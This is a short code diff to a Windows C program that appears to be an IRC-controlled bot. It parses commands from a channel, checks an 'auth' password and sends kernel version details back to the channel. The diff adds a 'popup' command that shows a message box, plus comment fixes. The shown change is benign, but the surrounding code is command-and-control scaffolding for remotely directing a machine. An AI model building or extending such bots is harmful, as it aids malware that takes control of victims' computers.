@@ -35,11 +35,11 @@ void et_main_loop_win(SOCKET socket, char *nick)
 		{
 			char *line = strtok(buf, "\r\n");
 			char *cmd = strrchr(line, ':');
-			cmd++;
+			cmd++; /* increment past ':' */
 
 			if (strstr(cmd, "auth") && !(strstr(cmd, "deauth")))
 			{
-				cmd += 5; /* increment past 'auth' */
+				cmd += 5; /* increment past 'auth ' */
 				char auth_message[256];
 
 				if (!strcmp(cmd, IRC_AUTH))
@@ -85,6 +85,11 @@ void et_main_loop_win(SOCKET socket, char *nick)
 						_snprintf(kern, 256, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
 						
 						send(socket, kern, strlen(kern), 0);
+					}
+					else if (strstr(cmd, "popup"))
+					{
+						cmd += 6; /* increment past 'popup ' */
+						MessageBox(NULL, cmd, "ET says hi", MB_OK | MB_ICONINFORMATION);
 					}
 					else
 					{
